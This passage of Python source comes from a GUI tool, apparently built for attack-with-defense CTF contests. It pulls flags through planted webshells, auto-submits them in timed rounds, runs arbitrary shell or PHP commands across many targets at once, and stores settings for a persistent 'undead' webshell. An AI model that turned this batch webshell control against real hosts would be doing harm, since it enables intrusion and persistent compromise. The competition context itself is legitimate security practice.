                core.base_from_url(base_template, targets[0])
            except ValueError as exc:
                self.log('[%s] 木马 URL 有误：%s' % (tag, exc), 'fail')
                return
        self.set_status('正在取 flag…' if not do_submit else '正在取 flag 并提交…')
        self.log('[%s] 目标 %d 台，并发 %d，%s' % (
            tag, len(targets), config.提交并发,
            '只提交变化' if only_changed else '全量提交'), 'info')
        if config.全局去重:
            self.log('[%s] 已开启全局去重：其他目标提交过的相同 flag 会跳过' % tag,
                     'info')
        if config.提交间隔:
            self.log('[%s] 已开启提交限速：每 %.2f 秒最多一次' % (
                tag, config.提交间隔), 'info')

        last_snapshot = dict(self._last_flag)
        submitted_snapshot = dict(self._submitted)
        known_snapshot = dict(self._flag_path)

        def work(thread):
            rows, ok, fail, done = [], 0, 0, 0
            found_paths = {}
            responses = {}
            total = len(targets)
            dedup = bool(config.全局去重)
            dedup_lock = threading.Lock()
            dedup_flags = {str(v) for v in submitted_snapshot.values() if v}
            limiter = core.RateLimiter(config.提交间隔)

            def one(target):
                key = core.target_key(target)
                if self._stop:
                    return key, '', '已停止', time.strftime('%H:%M:%S'), '', None
                base = (core.base_from_url(base_template, target)
                        if base_template else core.base_default(target))
                known = known_snapshot.get(key)
                flag, detail, used_path = core.fetch_flag_detail(
                    core.get_session(), base, conf['cmd'],
                    known_paths=[known] if known else None)
                stamp = time.strftime('%H:%M:%S')
                if not flag:
                    return (key, '', '未取到 flag：%s' % (detail or '')[:160],
                            stamp, used_path, None)
                if dedup and flag in dedup_flags and submitted_snapshot.get(key) != flag:
                    return key, flag, '跳过（重复 flag）', stamp, used_path, None
                if (only_changed and last_snapshot.get(key) == flag
                        and submitted_snapshot.get(key) == flag):
                    return key, flag, '跳过（未变化）', stamp, used_path, None
                if not do_submit:
                    return key, flag, '已获取', stamp, used_path, None
                try:
                    limiter.wait()
                    resp = core.submit_flag_retry(
                        core.get_session(), submission, flag, conf['param'])
                    info = {
                        'status': int(getattr(resp, 'status_code', 0) or 0),
                        'reason': str(getattr(resp, 'reason', '') or ''),
                        'url': str(getattr(resp, 'url', '')
                                   or getattr(submission, 'url', '') or ''),
                        'method': str(getattr(submission, 'method', '') or ''),
                        'headers': dict(getattr(resp, 'headers', {}) or {}),
                        'text': getattr(resp, 'text', '') or '',
                    }
                    if resp.status_code in (401, 403, 429):
                        self._breaker = True
                        self._stop = True
                    verdict, why = core.judge_submission(resp)
                    if verdict == 'success':
                        if dedup:
                            with dedup_lock:
                                dedup_flags.add(flag)
                        return key, flag, '成功', stamp, used_path, info
                    if verdict == 'fail':
                        return key, flag, '失败：%s' % why, stamp, used_path, info
                    return key, flag, '未知：%s' % why, stamp, used_path, info
                except Exception as exc:  # noqa: BLE001 - 单台提交失败不影响其他目标
                    return (key, flag, '提交异常：%s' % core.classify_error(exc),
                            stamp, used_path, None)

            def on_row(row):
                nonlocal ok, fail, done
                target, result, error = row
                done += 1
                thread.sig_progress.emit(done, total)
                key = core.target_key(target)
                stamp = time.strftime('%H:%M:%S')
                used_path = ''
                info = None
                if error:
                    row_data = (key, '', '任务异常：%s' % error, stamp)
                elif isinstance(result, tuple) and len(result) >= 4:
                    row_data = result[:4]
                    if len(result) >= 5:
                        used_path = str(result[4] or '')
                    if len(result) >= 6:
                        info = result[5]
                else:
                    row_data = (key, '', '结果异常', stamp)
                rows.append(row_data)
                if info:
                    responses[key] = info
                if row_data[1] and used_path:
                    found_paths[key] = used_path
                mark = row_data[2]
                if mark == '成功' or mark == '已获取':
                    ok += 1
                    thread.sig_log.emit('[%s] %s => %s' % (
                        '提交' if mark == '成功' else 'flag',
                        key, row_data[1]), 'ok')
                elif mark.startswith('失败') or mark.startswith('未取到') \
                        or mark.startswith('提交异常') or mark.startswith('未知') \
                        or mark.startswith('任务异常'):
                    fail += 1
                    thread.sig_log.emit('[失败] %s %s' % (key, mark), 'fail')
                else:
                    thread.sig_log.emit('[跳过] %s %s' % (key, mark), 'info')

            core.run_batch(targets, one, workers=config.提交并发,
                           stop=lambda: self._stop, on_done=on_row)
            rows.sort(key=lambda r: core.ip_sort_key(r[0]))
            thread.sig_responses.emit(responses)
            thread.sig_paths.emit(found_paths)
            self._emit_rows(thread, rows, 'flag')
            return ok, fail

        self._start(title, work)

    def on_submit(self, auto=False):
        targets = self._read_targets()
        self._do_fetch_submit(targets, '自动提交' if auto else '提交',
                              True, only_changed=bool(auto))

    def on_submit_one(self):
        targets = self._read_targets()
        if targets:
            self._do_fetch_submit(targets[:1], '试跑', True)

    def on_fetch_only(self):
        self._do_fetch_submit(self._read_targets(), '取flag', False)

    def on_submit_retry(self):
        failed = []
        for row in self._rows['flag']:
            mark = str(row[2]) if len(row) > 2 else ''
            if (mark.startswith('失败') or mark.startswith('未取到')
                    or mark.startswith('提交异常') or mark.startswith('未知')
                    or mark.startswith('任务异常')):
                target = core.parse_target_line(str(row[0]))
                if target:
                    failed.append(target)
        if not failed:
            self.log('[提交] 没有可重试的失败项', 'info')
            return
        self.log('[提交] 重试 %d 台失败目标' % len(failed), 'info')
        self._do_fetch_submit(failed, '提交重试', True)

    def on_open_inbox(self):
        dlg = QDialog(self)
        dlg.setWindowTitle('Flag 收件箱')
        dlg.resize(560, 360)
        lay = QVBoxLayout(dlg)
        tip = QLabel('每行一个 flag，支持 flag{...} 或整段文本；'
                     '提交使用当前提交报文与参数名')
        tip.setObjectName('Hint')
        lay.addWidget(tip)
        edit = QPlainTextEdit()
        edit.setObjectName('Mono')
        edit.setPlaceholderText('flag{...}')
        lay.addWidget(edit, 1)
        row = QHBoxLayout()
        row.addStretch(1)
        cancel = QPushButton('取消')
        cancel.setObjectName('Ghost')
        cancel.clicked.connect(dlg.reject)
        row.addWidget(cancel)
        submit = QPushButton('提交')
        submit.setObjectName('Primary')
        submit.clicked.connect(dlg.accept)
        row.addWidget(submit)
        lay.addLayout(row)
        if dlg.exec() == QDialog.Accepted:
            self.on_submit_inbox(edit.toPlainText())

    def on_submit_inbox(self, text=''):
        conf = self._submit_inputs()
        if not conf['raw']:
            self.log('[收件箱] 请先粘贴 HTTP 请求报文', 'fail')
            return
        if not conf['param']:
            self.log('[收件箱] 请填写提交参数名', 'fail')
            return
        try:
            submission = core.prepare_submission(conf['raw'])
        except ValueError as exc:
            self.log('[收件箱] 报文解析失败：%s' % exc, 'fail')
            return
        flags = core.parse_flag_text(text or '')
        if not flags:
            self.log('[收件箱] 没有解析到 flag', 'fail')
            return
        self.log('[收件箱] 共 %d 个 flag，开始提交' % len(flags), 'info')

        def work(thread):
            rows, ok, fail, done = [], 0, 0, 0
            total = len(flags)
            dedup = bool(config.全局去重)
            dedup_lock = threading.Lock()
            dedup_flags = {str(v) for v in self._submitted.values() if v}
            limiter = core.RateLimiter(config.提交间隔)

            def one(flag):
                if self._stop:
                    return flag, '已停止'
                if dedup and flag in dedup_flags:
                    return flag, '跳过（重复 flag）'
                try:
                    limiter.wait()
                    resp = core.submit_flag_retry(
                        core.get_session(), submission, flag, conf['param'])
                    if resp.status_code in (401, 403, 429):
                        self._breaker = True
                        self._stop = True
                    verdict, why = core.judge_submission(resp)
                    if verdict == 'success':
                        if dedup:
                            with dedup_lock:
                                dedup_flags.add(flag)
                        return flag, '成功'
                    if verdict == 'fail':
                        return flag, '失败：%s' % why
                    return flag, '未知：%s' % why
                except Exception as exc:  # noqa: BLE001
                    return flag, '提交异常：%s' % core.classify_error(exc)

            def on_row(row):
                nonlocal ok, fail, done
                flag, result, error = row
                done += 1
                thread.sig_progress.emit(done, total)
                mark = error or (result[1] if isinstance(result, tuple) else '结果异常')
                rows.append(('手动-%d' % done, flag, mark, time.strftime('%H:%M:%S')))
                if mark == '成功':
                    ok += 1
                    thread.sig_log.emit('[收件箱] %s 提交成功' % flag, 'ok')
                elif mark.startswith('跳过'):
                    thread.sig_log.emit('[收件箱] %s %s' % (flag, mark), 'info')
                else:
                    fail += 1
                    thread.sig_log.emit('[收件箱] %s %s' % (flag, mark), 'fail')

            core.run_batch(flags, one, workers=config.提交并发,
                           stop=lambda: self._stop, on_done=on_row)
            self._emit_rows(thread, rows, 'inbox')
            return ok, fail

        self._start('收件箱', work)

    # ---------------- 自动轮次 ----------------
    def on_auto_start(self):
        if self._auto_on:
            return
        if self._running or self._thread is not None:
            self.log('[自动] 当前还有任务在运行，请先停止或等待完成', 'fail')
            return
        targets = self._read_targets()
        if not targets:
            self.log('[自动] 目标列表为空', 'fail')
            return
        if not self.txt_request.toPlainText().strip():
            self.log('[自动] 请先粘贴提交报文', 'fail')
            return
        if not self.ed_param.text().strip():
            self.log('[自动] 请填写提交参数名', 'fail')
            return
        config.轮次秒数 = int(self.sp_round.value())
        if not config.save_settings({'轮次秒数': config.轮次秒数}):
            self.log('[自动] 轮次间隔保存失败，本次仍按 %d 秒运行' % config.轮次秒数, 'warn')
        self._auto_on = True
        self._round_left = int(config.轮次秒数)
        self._round_stats = ''
        self._auto_timer.start()
        self.btn_auto_start.setEnabled(False)
        self.btn_auto_stop.setEnabled(True)
        self.lbl_countdown.setText('下一轮 00:00')
        self.log('[自动] 已启动，间隔 %d 秒' % self._round_left, 'ok')
        self.on_submit(auto=True)

    def on_auto_stop(self):
        was_on = self._auto_on
        self._auto_on = False
        if hasattr(self, '_auto_timer'):
            self._auto_timer.stop()
        if hasattr(self, 'btn_auto_start'):
            self.btn_auto_start.setEnabled(not self._running)
        if hasattr(self, 'btn_auto_stop'):
            self.btn_auto_stop.setEnabled(False)
        if hasattr(self, 'lbl_countdown'):
            self.lbl_countdown.setText('未启动')
        if was_on:
            self.log('[自动] 已停止', 'info')

    def _auto_tick(self):
        if not self._auto_on:
            return
        if self._thread is None and not self._running:
            self._round_left -= 1
            if self._round_left <= 0:
                self._round_left = int(config.轮次秒数)
                self.log('[自动] 开始新一轮（%d 秒）' % self._round_left, 'info')
                self.on_submit(auto=True)
        left = max(0, self._round_left)
        mins, secs = divmod(left, 60)
        suffix = (' · ' + self._round_stats) if self._round_stats else ''
        self.lbl_countdown.setText('下一轮 %02d:%02d%s' % (mins, secs, suffix))

    # ---------------- 命令台 / 巡检 ----------------
    def _on_preset(self, index):
        if index <= 0 or index >= len(PRESETS):
            return
        self.txt_cmd.setPlainText(PRESETS[index][1])
        self.cb_cmd_mode.setCurrentIndex(0)

    def _do_command(self, targets, title, health=False):
        command = self.txt_cmd.toPlainText().strip()
        mode = 'php' if self.cb_cmd_mode.currentText() == 'PHP 代码' else 'shell'
        if not health and not command:
            self.log('[命令] 命令为空', 'fail')
            return
        if not targets:
            self.log('[命令] 目标列表为空', 'fail')
            return
        base_template = self.ed_url.text().strip()
        if base_template:
            try:
                core.base_from_url(base_template, targets[0])
            except ValueError as exc:
                self.log('[命令] 木马 URL 有误：%s' % exc, 'fail')
                return
        self.log('[命令] 目标 %d 台，%s' % (
            len(targets), '健康巡检' if health else '并发 %d' % config.任务并发), 'info')

        def work(thread):
            rows, ok, fail, done = [], 0, 0, 0
            total = len(targets)

            def one(target):
                key = core.target_key(target)
                base = (core.base_from_url(base_template, target)
                        if base_template else core.base_default(target))
                started = time.time()
                if health:
                    alive, detail = core.check_shell(core.get_session(), base)
                    status = '存活' if alive else '死亡'
                    text = 'ok' if alive else detail
                elif mode == 'php':
                    text, error = core.exec_php(core.get_session(), base, command)
                    if text and core.MARK in text:
                        text = core.between_markers(text)
                    if error:
                        status = '失败：%s' % error
                    elif (text or '').strip():
                        status = '成功'
                    else:
                        status = '空'
                else:
                    text, error = core.exec_shell(core.get_session(), base, command)
                    if error:
                        status = '失败：%s' % error
                    elif (text or '').strip():
                        status = '成功'
                    else:
                        status = '空'
                elapsed = '%.2fs' % (time.time() - started)
                return key, text or '', elapsed, status

            def on_row(row):
                nonlocal ok, fail, done
                target, result, error = row
                done += 1
                thread.sig_progress.emit(done, total)
                if error:
                    row_data = (core.target_key(target), '', '0.00s',
                                '失败：%s' % error)
                elif isinstance(result, tuple) and len(result) == 4:
                    row_data = result
                else:
                    row_data = (core.target_key(target), '', '0.00s', '结果异常')
                rows.append(row_data)
                status = row_data[3]
                if status in ('成功', '存活'):
                    ok += 1
                elif status.startswith('失败') or status == '死亡':
                    fail += 1
                thread.sig_log.emit('[命令] %s %s' % (row_data[0], status),
                                    'ok' if status in ('成功', '存活') else 'fail')

            core.run_batch(targets, one, workers=config.任务并发,
                           stop=lambda: self._stop, on_done=on_row)
            rows.sort(key=lambda r: core.ip_sort_key(r[0]))
            self._emit_rows(thread, rows, 'command')
            return ok, fail

        self._start(title, work)

    def on_command(self):
        self._do_command(self._read_targets(), '命令')

    def on_health(self):
        self._do_command(self._read_targets(), '巡检', health=True)

    def on_defense(self):
        targets = self._read_targets()
        if not targets:
            self.log('[体检] 目标列表为空', 'fail')
            return
        template = self.ed_url.text().strip()
        if template:
            try:
                core.base_from_url(template, targets[0])
            except ValueError as exc:
                self.log('[体检] 木马 URL 有误：%s' % exc, 'fail')
                return
        self.log('[体检] 目标 %d 台，并发 %d' % (
            len(targets), config.任务并发), 'info')

        def work(thread):
            rows, ok, fail = [], 0, 0
            reports = []

            def one(target):
                key = core.target_key(target)
                base = (core.base_from_url(template, target)
                        if template else core.base_default(target))
                return key, core.defense_check(
                    core.get_session(), base)

            results = core.run_batch(targets, one, workers=config.任务并发,
                                     stop=lambda: self._stop)
            for target, result, error in results:
                key = core.target_key(target)
                if error:
                    result = {'error': error,
                              'findings': [('错误', '体检失败', error)],
                              'sections': {}, 'raw': ''}
                elif isinstance(result, tuple) and len(result) == 2:
                    key, result = result
                findings = (result.get('findings', [])
                            if isinstance(result, dict) else [])
                levels = [str(item[0]) for item in findings]
                if '严重' in levels:
                    status = '严重'
                    fail += 1
                elif '注意' in levels:
                    status = '注意'
                    fail += 1
                elif '错误' in levels:
                    status = '错误'
                    fail += 1
                elif '提示' in levels:
                    status = '提示'
                else:
                    status = '正常'
                    ok += 1
                summary = '；'.join(str(item[1]) for item in findings[:3])
                rows.append((key, summary, '', status))
                reports.append(core.defense_report(result, key))
            rows.sort(key=lambda r: core.ip_sort_key(r[0]))
            thread.sig_report.emit('\n\n'.join(reports))
            self._emit_rows(thread, rows, 'command')
            return ok, fail

        self._start('防守体检', work)

    def _show_report(self, text):
        if not text:
            return
        dlg = QDialog(self)
        dlg.setWindowTitle('防守体检报告')
        dlg.resize(820, 620)
        dlg.setAttribute(Qt.WA_DeleteOnClose)
        lay = QVBoxLayout(dlg)
        edit = QPlainTextEdit()
        edit.setObjectName('Mono')
        edit.setReadOnly(True)
        edit.setPlainText(text)
        lay.addWidget(edit, 1)
        row = QHBoxLayout()
        row.addStretch(1)
        close = QPushButton('关闭')
        close.setObjectName('Primary')
        close.clicked.connect(dlg.accept)
        row.addWidget(close)
        lay.addLayout(row)
        self._report_dlg = dlg
        dlg.show()

    def on_command_export(self):
        rows = self._rows.get('command') or []
        if not rows:
            self.log('[命令] 还没有可导出的结果', 'info')
            return
        self._export_csv(rows, ['ip', 'output', 'elapsed', 'status'],
                         'awd_command.csv')

    # ---------------- 导出 ----------------
    def _export_csv(self, rows, headers, default_name):
        path, _ = QFileDialog.getSaveFileName(
            self, '导出结果', default_name, 'CSV (*.csv)')
        if not path:
            return
        try:
            with open(path, 'w', encoding='utf-8-sig', newline='') as f:
                f.write(','.join(headers) + '\n')
                for row in rows:
                    cells = [str(c).replace('"', '""').replace('\n', ' ')
                             for c in row]
                    f.write(','.join('"%s"' % c for c in cells) + '\n')
        except OSError as exc:
            self.log('[结果] 导出失败：%s' % exc, 'fail')
            return
        self.log('[结果] 已导出 %d 条到 %s' % (len(rows), path), 'ok')

    def on_export_rows(self):
        if self._rows.get('flag'):
            self._export_csv(self._rows['flag'],
                             ['ip', 'flag', 'result', 'time'], 'awd_result.csv')
        elif self._rows.get('write'):
            self._export_csv(self._rows['write'],
                             ['ip', 'result', 'detail'], 'awd_write.csv')
        else:
            self.log('[结果] 还没有可导出的结果', 'info')

    # ---------------- 设置 ----------------
    def _settings_values(self):
        return {
            '不死马路径': self.st_busima_path.text().strip(),
            '运行的不死马路径': self.st_run_path.text().strip(),
            '木马文件名': self.st_trojan.text().strip(),
            '木马的pass密码': self.st_passcode.text().strip(),
            '木马密码': self.st_cmdparam.text().strip(),
            '写入请求头': self.ed_headers.text().strip(),
            '请求超时': self._num(self.st_timeout.text(), config.请求超时),
            '扫描超时': self._num(self.st_scantimeout.text(), config.扫描超时),
            '并发数': int(self._num(self.st_workers.text(), config.并发数)),
            '任务并发': int(self._num(self.st_task_workers.text(), config.任务并发)),
            '提交并发': int(self._num(self.st_submit_workers.text(), config.提交并发)),
            '提交间隔': max(0.0, min(5.0, float(self._num(
                self.st_interval.text(), config.提交间隔)))),
            '轮次秒数': int(self.sp_round.value()),
            '目标端口': self.st_port.text().strip() or '80',
            '成功关键字': self.st_okword.text().strip(),
            '全局去重': bool(self.chk_dedup.isChecked()),
            '提交协议': ['auto', 'http', 'https'][self.cb_scheme.currentIndex()],
            '界面字号': self._clamp_font(self.st_font.text()),
            '主题': 'dark' if self.cb_theme.currentIndex() == 1 else 'light',
            '窗口宽': self.width(),
            '窗口高': self.height(),
        }

    @staticmethod
    def _num(text, default):
        try:
            value = float(text)
            return int(value) if value == int(value) else value
        except (TypeError, ValueError):
            return default

    def _fill_settings(self):
        self.st_busima_path.setText(str(config.不死马路径))
        self.st_run_path.setText(str(config.运行的不死马路径))
        self.st_trojan.setText(str(config.木马文件名))
        self.st_passcode.setText(str(config.木马的pass密码))
        self.st_cmdparam.setText(str(config.木马密码))
        self.ed_headers.setText(str(config.写入请求头))
        self.st_timeout.setText(str(config.请求超时))
        self.st_scantimeout.setText(str(config.扫描超时))
        self.st_workers.setText(str(config.并发数))
        self.st_task_workers.setText(str(config.任务并发))
        self.st_submit_workers.setText(str(config.提交并发))
        self.st_interval.setText(str(config.提交间隔))
        self.st_port.setText(str(config.目标端口))
        self.st_okword.setText(str(config.成功关键字))
        self.chk_dedup.setChecked(bool(config.全局去重))
        self.cb_scheme.setCurrentIndex(
            {'auto': 0, 'http': 1, 'https': 2}.get(config.提交协议, 0))
        self.st_font.setText(str(config.界面字号))
        self.cb_theme.setCurrentIndex(1 if config.主题 == 'dark' else 0)
        self.sp_round.setValue(int(config.轮次秒数))
        self.ed_port.setText(str(config.目标端口))

    def on_save_settings(self):
        values = self._settings_values()
        if not values['木马文件名'] or not values['不死马路径']:
            self.log('[设置] 不死马路径 / 木马文件名不能为空', 'fail')
            return
        if not values['运行的不死马路径'] or not values['木马密码']:
            self.log('[设置] 访问相对路径 / 命令参数名不能为空', 'fail')
            return
        port = values['目标端口']
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            self.log('[设置] 目标端口不合法：%s' % port, 'fail')
            return
        old_pass = config.木马的pass密码
        old_param = config.木马密码
        if not config.save_settings(values):
            self.log('[设置] 保存失败：settings.json 不可写', 'fail')
            return
        # 回填一次，让界面显示被 _coerce 收敛后的真实值（例如并发超范围）
        self._fill_settings()
        if values['木马的pass密码'] != old_pass or values['木马密码'] != old_param:
            self.log('[设置] pass / 参数名已变更，请点「载入默认代码」重新生成不死马', 'warn')
        self.ed_port.setText(str(config.目标端口))
        if values['界面字号'] != self._ui_font:
            self._set_log_size(font=values['界面字号'])
        if values['主题'] != self._theme:
            self._theme = values['主题']
            self._apply_theme()
            self.btn_theme.setText('切换浅色' if self._theme == 'dark' else '切换深色')
            self.update()
        self.log('[设置] 已保存到 settings.json', 'ok')

    def on_reset_settings(self):
        config.reset_settings()
        config.restore_defaults()
        self._fill_settings()
        self._theme = config.主题 if config.主题 in PALETTES else 'light'
        self._ui_font = self._clamp_font(config.界面字号)
        self._apply_theme()
        self.btn_theme.setText('切换浅色' if self._theme == 'dark' else '切换深色')
        self.update()
        self.log('[设置] 已删除 settings.json 并恢复默认值', 'ok')
        self.log('[设置] pass/参数名已恢复默认，请点「载入默认代码」重新生成不死马', 'warn')

    def on_open_settings_file(self):
        if not os.path.exists(config.设置文件):
            config.save_settings(self._settings_values())
        if not QDesktopServices.openUrl(QUrl.fromLocalFile(config.设置文件)):
            self.log('[设置] 无法打开：%s' % config.设置文件, 'fail')

    # ---------------- 退出 ----------------
    def closeEvent(self, event):
        if self._thread is not None and self._thread.isRunning():
            answer = QMessageBox.question(
                self, '任务进行中', '任务还在执行，确定要退出吗？',
                QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
            if answer != QMessageBox.Yes:
                event.ignore()
                return
            self._stop = True
            if not self._thread.wait(4000):
                self._thread.terminate()
                self._thread.wait(1000)
        self.on_auto_stop()
        self._save_state()
        config.窗口宽 = self.width()
        config.窗口高 = self.height()
        config.save_settings({'窗口宽': config.窗口宽, '窗口高': config.窗口高})
        if self._log_file:
            try:
                self._log_file.close()
            except OSError:
                pass
            self._log_file = None
        event.accept()


def run():
    config.ensure_dirs()
    config.load_settings()
    app = QApplication.instance() or QApplication([])
    window = MainWindow()
    window.show()
    return app.exec()


if __name__ == '__main__':
    raise SystemExit(run())
